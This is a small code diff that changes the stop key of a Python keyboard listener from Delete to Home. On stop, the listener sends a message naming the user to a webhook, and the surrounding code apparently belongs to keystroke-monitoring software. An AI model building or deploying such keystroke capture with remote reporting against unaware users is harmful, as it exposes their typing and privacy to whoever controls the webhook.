@@ -71,7 +71,7 @@ def on_press(key):
         last_keypress_time = time.time()
 
 def on_release(key):
-    if key == keyboard.Key.delete:
+    if key == keyboard.Key.home:
         send_to_webhook(f"Connection stopped by user: {username}")
         return False
 
